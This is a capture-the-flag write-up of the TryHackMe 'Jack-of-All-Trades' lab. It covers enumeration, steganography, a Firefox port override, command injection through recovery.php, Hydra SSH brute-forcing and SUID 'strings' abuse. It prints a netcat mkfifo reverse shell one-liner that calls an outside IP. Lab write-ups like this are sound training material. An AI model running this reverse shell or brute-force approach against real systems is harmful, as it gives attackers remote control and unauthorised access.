# Jack-of-All-Trades TryHackMe Writeup
### Level: `Easy` | OS: `Linux`

![logo](1.jpeg)

## Scanning
We performed an nmap scan of all ports, with scripts and software versions.

![](2.png)

## Enumeration
We tried to access the website from the browser, but it will not open.

![](3.png)

But, if we try **curl** we will see the content of the site, there is a string in **base64**.

![](4.png)

Decode the message, you will get a password.

![](5.png)

We access the file *"recovery.php "*, there we will have to decode another message, this time it will be more complicated.

![](6.png)

We access the site with the hint, we see a famous *"dinosaur"*. After reading the message and the image, we already sense what we have to do.

#### Download stego.jpg image

![](7.png)

Let's try the other image... And we got credentials.

![](8.png)

Searching through **Google**, we found this [tutorial](https://www.ryadel.com/en/firefox-this-address-is-restricted-override-fix-port/
) that explains how to change the port to browse **Firefox**, so we follow the guide, access the file *"recovery.php"* and use the credentials obtained.

![](9.png)

## Exploitation
We make a small one and check that we can execute commands.

![](9.png)

#### Reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f
```
We will use the above *payload + URL-Encode* to obtain a shell on the victim machine.

![](10.png)

We access the *"/home/"* and find a list of passwords for the user *"Jack"*.

![](11.png)

We use the **Hydra** tool to obtain the correct password in just seconds.

![](12.png)

We access by **SSH**, we enumerate a file *"user.jpg"*. We transfer it to our machine and read the user flag.

![](13.png)

#### Evidence user flag

![](14.png)

## Abuse of privileges
We launch the **lse.sh** tool, enumerate the uncommon SUID *strings* binary.

![](15.png)

We look for information, we see that it is possible to load a variable with an arbitrary path and to be able to execute **strings** to read its content. 

First, I tried to read the file *"id_rsa"* of the root user, but it does not exist. So a quick option is to read the flag directly.

![](16.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
